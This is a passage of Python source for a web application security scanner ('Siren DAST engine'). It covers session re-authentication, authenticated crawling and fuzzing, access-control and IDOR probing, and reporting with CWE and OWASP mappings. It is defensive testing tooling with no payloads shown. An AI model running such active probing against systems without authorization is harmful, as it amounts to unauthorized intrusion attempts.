            if self._session_check_status and response.status_code != self._session_check_status:
                with self._lock:
                    self._is_authenticated = False
                return False

            if self._session_check_string and self._session_check_string not in response.body:
                with self._lock:
                    self._is_authenticated = False
                return False

        return True

    def re_authenticate(self) -> bool:
        """Re-authenticate when session expires."""
        logger.info("Re-authenticating...")

        if self._token_refresh_url and self._refresh_token:
            success = self._refresh_auth_token()
            if success:
                return True

        with self._lock:
            self._is_authenticated = False
            self._auth_attempts = 0

        return self.authenticate()

    def _refresh_auth_token(self) -> bool:
        """Refresh the auth token using refresh token."""
        logger.debug("Attempting token refresh at %s", self._token_refresh_url)

        body = urllib.parse.urlencode({
            "grant_type": "refresh_token",
            "refresh_token": self._refresh_token,
        })

        response = self._client.request(
            "POST",
            self._token_refresh_url,
            body=body,
            headers={"Content-Type": "application/x-www-form-urlencoded"},
        )

        if response.error or response.status_code != 200:
            logger.warning("Token refresh failed")
            return False

        self._extract_auth_token(response)

        with self._lock:
            if self._auth_token:
                self._last_auth_time = time.time()
                self._is_authenticated = True
                logger.info("Token refresh successful")
                return True

        return False

    def get_auth_headers(self) -> Dict[str, str]:
        """Get authentication headers for requests."""
        with self._lock:
            headers: Dict[str, str] = {}
            if self._auth_token:
                if self._auth_header_prefix:
                    headers[self._auth_header_name] = f"{self._auth_header_prefix} {self._auth_token}"
                else:
                    headers[self._auth_header_name] = self._auth_token
            return headers

    def get_session_cookies(self) -> Dict[str, str]:
        """Get current session cookies."""
        with self._lock:
            return dict(self._session_cookies)

    def invalidate(self) -> None:
        """Invalidate current session."""
        with self._lock:
            self._is_authenticated = False
            self._session_cookies.clear()
            self._auth_token = ""
            self._refresh_token = ""
            self._client.clear_cookies()

    def get_stats(self) -> Dict[str, Any]:
        with self._lock:
            return {
                "is_authenticated": self._is_authenticated,
                "auth_attempts": self._auth_attempts,
                "last_auth_time": self._last_auth_time,
                "session_cookies_count": len(self._session_cookies),
                "has_auth_token": bool(self._auth_token),
                "has_refresh_token": bool(self._refresh_token),
            }


# ════════════════════════════════════════════════════════════════════════════════
# AUTHENTICATED SCANNER
# ════════════════════════════════════════════════════════════════════════════════

class AuthenticatedScanner:
    """
    Performs authenticated DAST scanning with session management.

    Crawls with authentication, re-authenticates on session expiry,
    and compares authenticated vs unauthenticated responses for
    access control testing.

    Usage:
        scanner = AuthenticatedScanner(session_manager, crawler, fuzzer)
        scanner.scan_authenticated(target_url)
        findings = scanner.get_findings()
    """

    def __init__(
        self,
        session_manager: Optional[SessionManager] = None,
        crawler: Optional[CrawlerEngine] = None,
        fuzzer: Optional[ParameterFuzzer] = None,
        analyzer: Optional[ResponseAnalyzer] = None,
        http_client: Optional[_HttpClient] = None,
    ) -> None:
        self._lock = threading.RLock()
        self._client: _HttpClient = http_client or _HttpClient()
        self._session: SessionManager = session_manager or SessionManager(self._client)
        self._crawler: CrawlerEngine = crawler or CrawlerEngine("", self._client)
        self._fuzzer: ParameterFuzzer = fuzzer or ParameterFuzzer(self._client)
        self._analyzer: ResponseAnalyzer = analyzer or ResponseAnalyzer()
        self._findings: List[DASTFinding] = []
        self._auth_endpoints: List[Endpoint] = []
        self._unauth_endpoints: List[Endpoint] = []
        self._access_control_results: List[Dict[str, Any]] = []
        self._re_auth_count: int = 0
        self._check_interval: int = 20
        self._request_counter: int = 0
        logger.info("AuthenticatedScanner initialized")

    def scan_authenticated(self, target_url: str) -> List[DASTFinding]:
        """Perform full authenticated scan of target."""
        logger.info("Starting authenticated scan of %s", target_url)

        if not self._session.is_session_valid():
            if not self._session.authenticate():
                logger.error("Failed to authenticate for scan")
                return []

        self._crawler.set_target(target_url)
        auth_headers = self._session.get_auth_headers()
        for k, v in auth_headers.items():
            self._client.set_header(k, v)

        crawl_result = self._crawler.crawl()
        with self._lock:
            self._auth_endpoints = list(crawl_result.endpoints)

        logger.info("Authenticated crawl found %d endpoints", len(crawl_result.endpoints))

        for endpoint in crawl_result.endpoints:
            self._request_counter += 1
            if self._request_counter % self._check_interval == 0:
                self._ensure_session()

            fuzz_results = self._fuzzer.fuzz_endpoint(endpoint)
            for fr in fuzz_results:
                if fr.anomaly_detected and fr.vuln_type:
                    finding = self._fuzz_result_to_finding(fr, endpoint)
                    with self._lock:
                        self._findings.append(finding)

            if endpoint.forms:
                for form in endpoint.forms:
                    csrf_check = self._analyzer.detect_csrf_vulnerability(
                        form,
                        HttpResponse(
                            status_code=endpoint.status_code,
                            headers=endpoint.headers,
                        ),
                    )
                    if csrf_check:
                        finding = DASTFinding(
                            vuln_type=VulnType.CSRF,
                            severity=Severity.MEDIUM,
                            title=f"CSRF vulnerability in form at {form.action}",
                            description=csrf_check["details"],
                            url=form.action,
                            method=form.method,
                            confidence=csrf_check["confidence"],
                            cwe_id="CWE-352",
                            owasp_category="A01:2021 Broken Access Control",
                            remediation="Implement CSRF tokens for all state-changing forms.",
                        )
                        with self._lock:
                            self._findings.append(finding)

        security_resp = self._client.request("GET", target_url)
        sec_issues = self._analyzer.analyze_security_headers(security_resp)
        for issue in sec_issues:
            finding = DASTFinding(
                vuln_type=issue.get("vuln_type", VulnType.SECURITY_MISCONFIGURATION),
                severity=Severity.LOW,
                title=issue.get("details", "Security header issue"),
                description=issue.get("details", ""),
                url=target_url,
                confidence=issue.get("confidence", 0.5),
                detection_method=DetectionMethod.HEADER_ANALYSIS,
                cwe_id="CWE-693",
                owasp_category="A05:2021 Security Misconfiguration",
            )
            with self._lock:
                self._findings.append(finding)

        logger.info("Authenticated scan complete: %d findings", len(self._findings))
        return list(self._findings)

    def test_access_controls(self, target_url: str) -> List[DASTFinding]:
        """
        Compare authenticated vs unauthenticated access to discover
        broken access control vulnerabilities.
        """
        findings: List[DASTFinding] = []

        if not self._auth_endpoints:
            logger.warning("No authenticated endpoints to test. Run scan_authenticated first.")
            return findings

        logger.info("Testing access controls on %d endpoints", len(self._auth_endpoints))

        saved_cookies = self._client.get_cookies()
        saved_headers = self._session.get_auth_headers()

        self._client.clear_cookies()
        temp_client = _HttpClient()

        for endpoint in self._auth_endpoints:
            if endpoint.status_code in (401, 403):
                continue

            unauth_resp = temp_client.request("GET", endpoint.url)

            if unauth_resp.status_code == endpoint.status_code:
                body_sim = self._compute_body_similarity(
                    unauth_resp.body, ""
                )

                auth_resp = self._client.request("GET", endpoint.url)
                body_sim = self._compute_body_similarity(
                    unauth_resp.body, auth_resp.body
                )

                if body_sim > 0.85:
                    finding = DASTFinding(
                        vuln_type=VulnType.BROKEN_ACCESS_CONTROL,
                        severity=Severity.HIGH,
                        title=f"Broken access control: {endpoint.url}",
                        description=(
                            f"Endpoint accessible without authentication. "
                            f"Auth status: {endpoint.status_code}, "
                            f"Unauth status: {unauth_resp.status_code}, "
                            f"Body similarity: {body_sim:.2%}"
                        ),
                        url=endpoint.url,
                        confidence=min(body_sim, 0.90),
                        detection_method=DetectionMethod.CONTENT_DIFF,
                        cwe_id="CWE-284",
                        owasp_category="A01:2021 Broken Access Control",
                        remediation="Implement proper authentication and authorization checks.",
                    )
                    findings.append(finding)

                    self._access_control_results.append({
                        "url": endpoint.url,
                        "auth_status": endpoint.status_code,
                        "unauth_status": unauth_resp.status_code,
                        "body_similarity": body_sim,
                        "vulnerable": True,
                    })
                else:
                    self._access_control_results.append({
                        "url": endpoint.url,
                        "auth_status": endpoint.status_code,
                        "unauth_status": unauth_resp.status_code,
                        "body_similarity": body_sim,
                        "vulnerable": False,
                    })

            elif unauth_resp.status_code in (200,) and endpoint.status_code in (200,):
                self._access_control_results.append({
                    "url": endpoint.url,
                    "auth_status": endpoint.status_code,
                    "unauth_status": unauth_resp.status_code,
                    "vulnerable": False,
                })

        self._client.set_cookies(saved_cookies)
        for k, v in saved_headers.items():
            self._client.set_header(k, v)

        with self._lock:
            self._findings.extend(findings)

        logger.info("Access control test complete: %d findings", len(findings))
        return findings

    def test_idor(self, endpoints: Optional[List[Endpoint]] = None) -> List[DASTFinding]:
        """Test for IDOR vulnerabilities on numeric parameters."""
        findings: List[DASTFinding] = []
        targets = endpoints or self._auth_endpoints

        for endpoint in targets:
            for param in endpoint.parameters:
                if not param.value or not param.value.isdigit():
                    continue

                original_val = int(param.value)
                test_values = [
                    original_val - 1,
                    original_val + 1,
                    original_val + 100,
                    0,
                ]

                original_resp = self._client.request("GET", endpoint.url)

                for test_val in test_values:
                    if test_val == original_val or test_val < 0:
                        continue

                    parsed = urllib.parse.urlparse(endpoint.url)
                    query_params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
                    query_params[param.name] = [str(test_val)]
                    new_query = urllib.parse.urlencode(query_params, doseq=True)
                    test_url = urllib.parse.urlunparse((
                        parsed.scheme, parsed.netloc, parsed.path,
                        parsed.params, new_query, ""
                    ))

                    test_resp = self._client.request("GET", test_url)

                    if test_resp.status_code == 200 and not test_resp.error:
                        if len(test_resp.body) > 100:
                            sim = self._compute_body_similarity(
                                original_resp.body, test_resp.body
                            )
                            if 0.3 < sim < 0.95:
                                finding = DASTFinding(
                                    vuln_type=VulnType.IDOR,
                                    severity=Severity.HIGH,
                                    title=f"IDOR: {param.name}={test_val} at {endpoint.url}",
                                    description=(
                                        f"Parameter '{param.name}' changed from "
                                        f"{original_val} to {test_val} returns different "
                                        f"but valid data (similarity: {sim:.2%})"
                                    ),
                                    url=test_url,
                                    parameter=param.name,
                                    payload=str(test_val),
                                    confidence=0.65,
                                    detection_method=DetectionMethod.CONTENT_DIFF,
                                    cwe_id="CWE-639",
                                    owasp_category="A01:2021 Broken Access Control",
                                    remediation="Implement proper authorization checks for resource access.",
                                )
                                findings.append(finding)
                                break

        with self._lock:
            self._findings.extend(findings)

        return findings

    def _ensure_session(self) -> None:
        """Check and refresh session if needed."""
        if not self._session.is_session_valid():
            logger.info("Session expired, re-authenticating...")
            success = self._session.re_authenticate()
            if success:
                with self._lock:
                    self._re_auth_count += 1
                auth_headers = self._session.get_auth_headers()
                for k, v in auth_headers.items():
                    self._client.set_header(k, v)
            else:
                logger.error("Re-authentication failed during scan")

    def _fuzz_result_to_finding(self, fr: FuzzResult, endpoint: Endpoint) -> DASTFinding:
        """Convert a FuzzResult into a DASTFinding."""
        vuln_type = fr.vuln_type or VulnType.INFO_DISCLOSURE
        severity = self._classify_severity(vuln_type, fr.confidence)

        detection_map: Dict[str, DetectionMethod] = {
            "sql_error": DetectionMethod.ERROR_BASED,
            "time_based": DetectionMethod.TIME_BASED,
            "reflection": DetectionMethod.REFLECTION,
            "content_diff": DetectionMethod.CONTENT_DIFF,
            "status_code": DetectionMethod.STATUS_CODE,
            "stack_trace": DetectionMethod.ERROR_BASED,
            "debug_info": DetectionMethod.ERROR_BASED,
            "crlf": DetectionMethod.REFLECTION,
            "header_info": DetectionMethod.HEADER_ANALYSIS,
        }

        cwe_map: Dict[VulnType, str] = {
            VulnType.SQLI: "CWE-89",
            VulnType.SQLI_ERROR: "CWE-89",
            VulnType.SQLI_BLIND_TIME: "CWE-89",
            VulnType.SQLI_BLIND_BOOLEAN: "CWE-89",
            VulnType.XSS_REFLECTED: "CWE-79",
            VulnType.XSS_STORED: "CWE-79",
            VulnType.XSS_DOM: "CWE-79",
            VulnType.COMMAND_INJECTION: "CWE-78",
            VulnType.SSRF: "CWE-918",
            VulnType.LFI: "CWE-98",
            VulnType.RFI: "CWE-98",
            VulnType.PATH_TRAVERSAL: "CWE-22",
            VulnType.SSTI: "CWE-1336",
            VulnType.OPEN_REDIRECT: "CWE-601",
            VulnType.CRLF_INJECTION: "CWE-113",
            VulnType.XXE: "CWE-611",
            VulnType.INFO_DISCLOSURE: "CWE-200",
            VulnType.SENSITIVE_DATA_EXPOSURE: "CWE-200",
            VulnType.IDOR: "CWE-639",
        }

        owasp_map: Dict[VulnType, str] = {
            VulnType.SQLI: "A03:2021 Injection",
            VulnType.SQLI_ERROR: "A03:2021 Injection",
            VulnType.SQLI_BLIND_TIME: "A03:2021 Injection",
            VulnType.SQLI_BLIND_BOOLEAN: "A03:2021 Injection",
            VulnType.XSS_REFLECTED: "A03:2021 Injection",
            VulnType.XSS_STORED: "A03:2021 Injection",
            VulnType.COMMAND_INJECTION: "A03:2021 Injection",
            VulnType.SSRF: "A10:2021 SSRF",
            VulnType.SSTI: "A03:2021 Injection",
            VulnType.LFI: "A01:2021 Broken Access Control",
            VulnType.PATH_TRAVERSAL: "A01:2021 Broken Access Control",
            VulnType.OPEN_REDIRECT: "A01:2021 Broken Access Control",
            VulnType.IDOR: "A01:2021 Broken Access Control",
            VulnType.INFO_DISCLOSURE: "A05:2021 Security Misconfiguration",
        }

        remediation_map: Dict[VulnType, str] = {
            VulnType.SQLI: "Use parameterized queries / prepared statements. Never concatenate user input into SQL.",
            VulnType.SQLI_ERROR: "Use parameterized queries. Disable verbose error messages in production.",
            VulnType.SQLI_BLIND_TIME: "Use parameterized queries / prepared statements.",
            VulnType.SQLI_BLIND_BOOLEAN: "Use parameterized queries / prepared statements.",
            VulnType.XSS_REFLECTED: "Encode output, implement CSP, validate/sanitize input.",
            VulnType.COMMAND_INJECTION: "Avoid system calls with user input. Use safe APIs and allowlists.",
            VulnType.SSRF: "Validate and restrict URLs. Use allowlists for external requests.",
            VulnType.LFI: "Avoid user-controlled file paths. Use allowlists for file access.",
            VulnType.PATH_TRAVERSAL: "Canonicalize paths and restrict to allowed directories.",
            VulnType.SSTI: "Use sandboxed template engines. Never pass user input directly to templates.",
            VulnType.OPEN_REDIRECT: "Validate redirect destinations against an allowlist.",
            VulnType.CRLF_INJECTION: "Strip CR/LF characters from user input in HTTP responses.",
            VulnType.XXE: "Disable external entity processing in XML parsers.",
            VulnType.INFO_DISCLOSURE: "Disable verbose errors and debug information in production.",
            VulnType.SENSITIVE_DATA_EXPOSURE: "Remove sensitive data from responses. Disable debug mode.",
        }

        return DASTFinding(
            vuln_type=vuln_type,
            severity=severity,
            title=f"{vuln_type.name} in parameter '{fr.parameter}' at {endpoint.url}",
            description=fr.anomaly_details,
            url=endpoint.url,
            method=endpoint.method,
            parameter=fr.parameter,
            payload=fr.payload,
            evidence=fr.anomaly_details[:500],
            detection_method=detection_map.get(fr.anomaly_type, DetectionMethod.ERROR_BASED),
            confidence=fr.confidence,
            cwe_id=cwe_map.get(vuln_type, ""),
            owasp_category=owasp_map.get(vuln_type, ""),
            remediation=remediation_map.get(vuln_type, "Review and fix the vulnerability."),
            response_time=fr.response.elapsed if fr.response else 0.0,
            baseline_time=fr.baseline_response.elapsed if fr.baseline_response else 0.0,
            status_code=fr.response.status_code if fr.response else 0,
        )

    def _classify_severity(self, vuln_type: VulnType, confidence: float) -> Severity:
        """Classify severity based on vuln type and confidence."""
        critical_types = {
            VulnType.RCE, VulnType.COMMAND_INJECTION, VulnType.SQLI,
            VulnType.SQLI_ERROR, VulnType.XXE,
        }
        high_types = {
            VulnType.SQLI_BLIND_TIME, VulnType.SQLI_BLIND_BOOLEAN,
            VulnType.XSS_STORED, VulnType.SSRF, VulnType.LFI,
            VulnType.RFI, VulnType.SSTI, VulnType.AUTH_BYPASS,
            VulnType.BROKEN_ACCESS_CONTROL, VulnType.IDOR,
        }
        medium_types = {
            VulnType.XSS_REFLECTED, VulnType.XSS_DOM, VulnType.CSRF,
            VulnType.OPEN_REDIRECT, VulnType.PATH_TRAVERSAL,
            VulnType.CRLF_INJECTION, VulnType.CORS_MISCONFIGURATION,
        }

        if vuln_type in critical_types and confidence >= 0.5:
            return Severity.CRITICAL
        if vuln_type in high_types and confidence >= 0.4:
            return Severity.HIGH
        if vuln_type in medium_types and confidence >= 0.4:
            return Severity.MEDIUM
        if confidence < 0.3:
            return Severity.INFO
        return Severity.LOW

    def _compute_body_similarity(self, body1: str, body2: str) -> float:
        """Compute similarity ratio between two response bodies."""
        if not body1 and not body2:
            return 1.0
        if not body1 or not body2:
            return 0.0

        tokens1 = set(re.findall(r"\w+", body1[:10000]))
        tokens2 = set(re.findall(r"\w+", body2[:10000]))

        if not tokens1 and not tokens2:
            return 1.0

        intersection = tokens1 & tokens2
        union = tokens1 | tokens2
        if not union:
            return 1.0

        return len(intersection) / len(union)

    def get_findings(self) -> List[DASTFinding]:
        with self._lock:
            return list(self._findings)

    def get_access_control_results(self) -> List[Dict[str, Any]]:
        with self._lock:
            return list(self._access_control_results)

    def get_stats(self) -> Dict[str, Any]:
        with self._lock:
            return {
                "total_findings": len(self._findings),
                "auth_endpoints": len(self._auth_endpoints),
                "re_auth_count": self._re_auth_count,
                "access_control_tests": len(self._access_control_results),
            }


# ════════════════════════════════════════════════════════════════════════════════
# SIREN DAST ENGINE — MAIN ORCHESTRATOR
# ════════════════════════════════════════════════════════════════════════════════

class SirenDASTEngine:
    """
    Main orchestrator for Dynamic Application Security Testing.

    Combines crawling, form extraction, parameter fuzzing, response
    analysis, session management, and authenticated scanning into
    a unified DAST pipeline.

    Usage:
        engine = SirenDASTEngine()
        engine.configure(scan_mode=ScanMode.NORMAL, max_depth=10)
        report = engine.scan_target("https://example.com")
        findings = engine.get_findings()
        json_output = engine.export_json()

    Authenticated scanning:
        engine = SirenDASTEngine()
        engine.configure_auth(
            login_url="https://example.com/login",
            credentials={"username": "admin", "password": "pass"},
        )
        report = engine.scan_authenticated("https://example.com")
    """

    def __init__(self) -> None:
        self._lock = threading.RLock()
        self._client: _HttpClient = _HttpClient()
        self._crawler: CrawlerEngine = CrawlerEngine("", self._client)
        self._form_extractor: FormExtractor = FormExtractor()
        self._payload_generator: DynamicPayloadGenerator = DynamicPayloadGenerator()
        self._response_analyzer: ResponseAnalyzer = ResponseAnalyzer()
        self._fuzzer: ParameterFuzzer = ParameterFuzzer(self._client)
        self._session_manager: SessionManager = SessionManager(self._client)
        self._auth_scanner: AuthenticatedScanner = AuthenticatedScanner(
            session_manager=self._session_manager,
            crawler=self._crawler,
            fuzzer=self._fuzzer,
            analyzer=self._response_analyzer,
            http_client=self._client,
        )

        self._crawler.set_form_extractor(self._form_extractor)
        self._fuzzer.set_payload_generator(self._payload_generator)
        self._fuzzer.set_response_analyzer(self._response_analyzer)

        self._scan_mode: ScanMode = ScanMode.NORMAL
        self._target_url: str = ""
        self._findings: List[DASTFinding] = []
        self._crawl_result: Optional[CrawlResult] = None
        self._report: Optional[DASTReport] = None
        self._scan_start: float = 0.0
        self._scan_end: float = 0.0
        self._total_params_fuzzed: int = 0

        logger.info("SirenDASTEngine initialized")

    # ── Configuration ───────────────────────────────────────────────────────

    def configure(
        self,
        scan_mode: ScanMode = ScanMode.NORMAL,
        max_depth: int = 10,
        max_urls: int = MAX_URLS_DEFAULT,
        crawl_strategy: CrawlStrategy = CrawlStrategy.BFS,
        delay: float = DEFAULT_DELAY,
        timeout: float = DEFAULT_TIMEOUT,
        respect_robots: bool = True,
        fuzz_cookies: bool = False,
        fuzz_headers: bool = False,
        scope_patterns: Optional[List[str]] = None,
        exclude_patterns: Optional[List[str]] = None,
    ) -> None:
        """Configure the DAST engine."""
        with self._lock:
            self._scan_mode = scan_mode

        self._crawler.set_strategy(crawl_strategy)
        self._crawler.set_max_depth(max_depth)
        self._crawler.set_max_urls(max_urls)
        self._crawler.set_delay(delay)
        self._crawler.set_respect_robots(respect_robots)
        self._client.set_timeout(timeout)
        self._fuzzer.set_scan_mode(scan_mode)
        self._fuzzer.set_delay(delay)
        self._fuzzer.set_fuzz_cookies(fuzz_cookies)
        self._fuzzer.set_fuzz_headers(fuzz_headers)
        self._payload_generator.set_scan_mode(scan_mode)

        if scope_patterns:
            for p in scope_patterns:
                self._crawler.add_scope_pattern(p)
        if exclude_patterns:
            for p in exclude_patterns:
                self._crawler.add_exclude_pattern(p)

        logger.info("DAST engine configured: mode=%s, depth=%d, urls=%d",
                     scan_mode.name, max_depth, max_urls)

    def configure_auth(
        self,
        login_url: str,
        credentials: Dict[str, str],
        method: HttpMethod = HttpMethod.POST,
        headers: Optional[Dict[str, str]] = None,
        session_check_url: str = "",
        session_check_string: str = "",
        token_refresh_url: str = "",
    ) -> None:
        """Configure authentication for the scanner."""
        self._session_manager.set_login_sequence(login_url, credentials, method, headers)
        if session_check_url:
            self._session_manager.set_session_check(
                session_check_url, session_check_string
            )
        if token_refresh_url:
            self._session_manager.set_token_refresh(token_refresh_url)

        logger.info("Auth configured: login_url=%s", login_url)

    def configure_multi_step_auth(self, steps: List[Dict[str, Any]]) -> None:
        """Configure multi-step authentication."""
        self._session_manager.set_multi_step_login(steps)
        logger.info("Multi-step auth configured: %d steps", len(steps))

    # ── Core Operations ─────────────────────────────────────────────────────

    def scan_target(self, target_url: str) -> DASTReport:
        """
        Execute a full DAST scan against the target URL.

        Steps:
          1. Crawl the target to discover endpoints and forms
          2. Extract and analyze forms
          3. Fuzz all discovered parameters
          4. Analyze responses for vulnerabilities
          5. Generate findings and report
        """
        with self._lock:
            self._target_url = target_url
            self._findings.clear()
            self._scan_start = time.time()

        logger.info("═══ DAST SCAN START: %s (mode: %s) ═══",
                     target_url, self._scan_mode.name)

        crawl_result = self.crawl(target_url)

        forms = self.extract_forms(crawl_result)

        fuzz_findings = self.fuzz_parameters(crawl_result)

        self.detect_vulns(crawl_result)

        report = self.generate_report(crawl_result)

        with self._lock:
            self._scan_end = time.time()
            self._report = report
            report.scan_duration = self._scan_end - self._scan_start
            report.finished_at = self._scan_end

        logger.info("═══ DAST SCAN COMPLETE: %d findings in %.2fs ═══",
                     len(report.findings), report.scan_duration)

        return report

    def crawl(self, target_url: str) -> CrawlResult:
        """Crawl the target URL and discover endpoints."""
        self._crawler.set_target(target_url)
        crawl_result = self._crawler.crawl()
        with self._lock:
            self._crawl_result = crawl_result
        logger.info("Crawl discovered %d endpoints and %d forms",
                     len(crawl_result.endpoints), len(crawl_result.forms))
        return crawl_result

    def extract_forms(self, crawl_result: CrawlResult) -> List[FormData]:
        """Extract and catalog all forms from crawled pages."""
        all_forms: List[FormData] = []
        for endpoint in crawl_result.endpoints:
            all_forms.extend(endpoint.forms)
        logger.info("Extracted %d total forms", len(all_forms))
        return all_forms

    def fuzz_parameters(self, crawl_result: CrawlResult) -> List[DASTFinding]:
        """Fuzz all parameters from discovered endpoints."""
        findings: List[DASTFinding] = []
        total_params = 0

        for endpoint in crawl_result.endpoints:
            total_params += len(endpoint.parameters)
            for form in endpoint.forms:
                total_params += len(form.fields)

            fuzz_results = self._fuzzer.fuzz_endpoint(endpoint)

            for fr in fuzz_results:
                if fr.anomaly_detected and fr.vuln_type:
                    finding = self._auth_scanner._fuzz_result_to_finding(fr, endpoint)
                    findings.append(finding)

        with self._lock:
            self._findings.extend(findings)
            self._total_params_fuzzed = total_params

        logger.info("Fuzzed %d parameters, found %d vulnerabilities",
                     total_params, len(findings))
        return findings

    def analyze_responses(self, crawl_result: CrawlResult) -> List[DASTFinding]:
        """Analyze crawled responses for passive findings."""
        findings: List[DASTFinding] = []

        for endpoint in crawl_result.endpoints:
            resp = HttpResponse(
                status_code=endpoint.status_code,
                headers=endpoint.headers,
                url=endpoint.url,
            )
            sec_issues = self._response_analyzer.analyze_security_headers(resp)
            for issue in sec_issues:
                finding = DASTFinding(
                    vuln_type=issue.get("vuln_type", VulnType.SECURITY_MISCONFIGURATION),
                    severity=Severity.LOW,
                    title=issue.get("details", ""),
                    description=issue.get("details", ""),
                    url=endpoint.url,
                    confidence=issue.get("confidence", 0.5),
                    detection_method=DetectionMethod.HEADER_ANALYSIS,
                )
                findings.append(finding)

        with self._lock:
            self._findings.extend(findings)

        return findings

    def detect_vulns(self, crawl_result: CrawlResult) -> List[DASTFinding]:
        """Run passive vulnerability detection on crawl results."""
        findings: List[DASTFinding] = []

        first_endpoint = crawl_result.endpoints[0] if crawl_result.endpoints else None
        if first_endpoint:
            resp = HttpResponse(
                status_code=first_endpoint.status_code,
                headers=first_endpoint.headers,
                url=first_endpoint.url,
            )
            sec_findings = self.analyze_responses(crawl_result)
            findings.extend(sec_findings)

        for endpoint in crawl_result.endpoints:
            for form in endpoint.forms:
                resp = HttpResponse(
                    status_code=endpoint.status_code,
                    headers=endpoint.headers,
                )
                csrf_check = self._response_analyzer.detect_csrf_vulnerability(form, resp)
                if csrf_check:
                    finding = DASTFinding(
                        vuln_type=VulnType.CSRF,
                        severity=Severity.MEDIUM,
                        title=f"CSRF vulnerability in form at {form.action}",
                        description=csrf_check["details"],
                        url=form.action,
                        method=form.method,
                        confidence=csrf_check["confidence"],
                        cwe_id="CWE-352",
                        owasp_category="A01:2021 Broken Access Control",
                        remediation="Implement CSRF tokens for all state-changing forms.",
                    )
                    findings.append(finding)
                    with self._lock:
                        self._findings.append(finding)

        return findings

    def scan_authenticated(self, target_url: str) -> DASTReport:
        """Execute authenticated DAST scan."""
        with self._lock:
            self._target_url = target_url
            self._findings.clear()
            self._scan_start = time.time()

        logger.info("═══ AUTHENTICATED DAST SCAN START: %s ═══", target_url)

        auth_findings = self._auth_scanner.scan_authenticated(target_url)

        access_findings = self._auth_scanner.test_access_controls(target_url)

        idor_findings = self._auth_scanner.test_idor()

        all_findings = auth_findings + access_findings + idor_findings
        with self._lock:
            self._findings = all_findings

        crawl_result = self._crawl_result or CrawlResult(target_url=target_url)
        report = self.generate_report(crawl_result)
        report.authenticated = True

        with self._lock:
            self._scan_end = time.time()
            self._report = report
            report.scan_duration = self._scan_end - self._scan_start
            report.finished_at = self._scan_end

        logger.info("═══ AUTHENTICATED SCAN COMPLETE: %d findings in %.2fs ═══",
                     len(report.findings), report.scan_duration)

        return report

    # ── Reporting ────────────────────────────────────────────────────────────

    def get_findings(self) -> List[DASTFinding]:
        """Get all findings from the scan."""
        with self._lock:
            return list(self._findings)

    def get_findings_by_severity(self, severity: Severity) -> List[DASTFinding]:
        """Get findings filtered by severity."""
        with self._lock:
            return [f for f in self._findings if f.severity == severity]

    def get_findings_by_type(self, vuln_type: VulnType) -> List[DASTFinding]:
        """Get findings filtered by vulnerability type."""
        with self._lock:
            return [f for f in self._findings if f.vuln_type == vuln_type]

    def generate_report(self, crawl_result: Optional[CrawlResult] = None) -> DASTReport:
        """Generate a comprehensive DAST report."""
        with self._lock:
            report = DASTReport(
                target_url=self._target_url,
                scan_mode=self._scan_mode,
                findings=list(self._findings),
                crawl_result=crawl_result or self._crawl_result,
                total_endpoints=len(crawl_result.endpoints) if crawl_result else 0,
                total_forms=len(crawl_result.forms) if crawl_result else 0,
                total_parameters_fuzzed=self._total_params_fuzzed,
                total_requests_sent=self._client.total_requests,
                started_at=self._scan_start,
                scan_config={
                    "scan_mode": self._scan_mode.name,
                    "target_url": self._target_url,
                },
            )
            report.compute_summary()
            self._report = report
        return report

    def export_json(self, filepath: Optional[str] = None) -> str:
        """Export findings as JSON string. Optionally write to file."""
        with self._lock:
            report = self._report
            if not report:
                report = self.generate_report()

        json_str = json.dumps(report.to_dict(), indent=2, default=str)

        if filepath:
            try:
                with open(filepath, "w", encoding="utf-8") as f:
                    f.write(json_str)
                logger.info("Report exported to %s", filepath)
            except OSError as exc:
                logger.error("Failed to export report: %s", exc)

        return json_str

    def export_findings_json(self) -> str:
        """Export findings only as JSON."""
        with self._lock:
            findings = [f.to_dict() for f in self._findings]
        return json.dumps(findings, indent=2, default=str)

    # ── Utility ──────────────────────────────────────────────────────────────

    def get_stats(self) -> Dict[str, Any]:
        """Get comprehensive engine statistics."""
        with self._lock:
            return {
                "target_url": self._target_url,
                "scan_mode": self._scan_mode.name,
                "total_findings": len(self._findings),
                "total_params_fuzzed": self._total_params_fuzzed,
                "total_requests": self._client.total_requests,
                "scan_duration": self._scan_end - self._scan_start if self._scan_end else 0,
                "crawler_stats": {
                    "urls_visited": len(self._crawl_result.urls_visited) if self._crawl_result else 0,
                    "endpoints": len(self._crawl_result.endpoints) if self._crawl_result else 0,
                    "forms": len(self._crawl_result.forms) if self._crawl_result else 0,
                },
                "fuzzer_stats": self._fuzzer.get_stats(),
                "analyzer_stats": self._response_analyzer.get_stats(),
                "form_extractor_stats": self._form_extractor.get_stats(),
                "payload_generator_stats": self._payload_generator.get_stats(),
                "session_stats": self._session_manager.get_stats(),
            }

    def get_severity_summary(self) -> Dict[str, int]:
        """Get count of findings per severity level."""
        with self._lock:
            summary: Dict[str, int] = defaultdict(int)
            for f in self._findings:
                summary[f.severity.name] += 1
            return dict(summary)

    def get_vuln_type_summary(self) -> Dict[str, int]:
        """Get count of findings per vulnerability type."""
        with self._lock:
            summary: Dict[str, int] = defaultdict(int)
            for f in self._findings:
                summary[f.vuln_type.name] += 1
            return dict(summary)

    def reset(self) -> None:
        """Reset engine state for a new scan."""
        with self._lock:
            self._findings.clear()
            self._crawl_result = None
            self._report = None
            self._scan_start = 0.0
            self._scan_end = 0.0
            self._total_params_fuzzed = 0
            self._client.clear_cookies()
        logger.info("SirenDASTEngine reset")

    def add_custom_payload(self, vuln_type: VulnType, payload: str) -> None:
        """Add a custom payload for a specific vulnerability type."""
        self._payload_generator.add_custom_payload(vuln_type, payload)

    def set_user_agent(self, user_agent: str) -> None:
        """Set custom User-Agent for all requests."""
        self._client.set_header("User-Agent", user_agent)

    def set_custom_header(self, name: str, value: str) -> None:
        """Set a custom header for all requests."""
        self._client.set_header(name, value)

    def set_cookies(self, cookies: Dict[str, str]) -> None:
        """Set cookies for all requests."""
        self._client.set_cookies(cookies)
